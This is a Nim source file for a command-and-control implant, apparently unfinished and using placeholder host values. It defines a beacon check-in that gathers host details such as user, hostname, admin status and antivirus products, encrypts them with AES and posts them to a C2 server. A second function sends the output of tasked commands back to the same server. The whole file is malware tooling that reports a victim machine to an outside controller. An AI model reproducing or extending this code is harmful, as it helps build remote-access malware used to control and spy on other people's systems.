import httpclient, json, strformat
import config, crypto
import times
import std/parseutils
import utils


let client = newHttpClient()

proc sendCheckin*(id: string): string =
    let checkin_payload = %*{
      "id": id, #agent's id
      "user": "kali",
      "hostname": "kali", #name of the host in whcih the agent is residing
      "os_version": "1.2.3",
      "os_build": "327.112.1",
      "architecture": "x64",
      "process_id": "12323",
      "process_name": "beacon",
      "internal_ip": "127.0.0.1",
      "external_ip": "127.0.0.1",
      "domain": "workgroup",
      "is_admin": "no",
      "av_products":"defender",
      "beacon_start_time":  $now(),
      "first_checkin": $now(),
      "implant_version": IMPLANT_VERSION,
      "beacon_key": PER_BEACON_KEY,
      "timestamp": $now(), #like last seen or last activity
      "status": "Active",
    }

    let key = hexToBytes(AES_KEY)

    let enc = encryptJson(checkin_payload, $key)
    return client.postContent(C2_URL & CHECKIN_URI, enc) #post request http://127.0.0.1:8080/api/checkin with enc as body
    #in backend getNextTask(id) -> return the task for the agent as (task_id,cmd)

proc sendTaskResult*(id: string, task_id: string,command: string,output: string): string =
    let payload = %*{
      "agent_id": id,
      "task_id": task_id,
      "command": command,
      "data": output
    }
    let enc = $payload
    return client.postContent(C2_URL & RESULT_URI, enc)

type Task = object
    task_id: string
    command: string

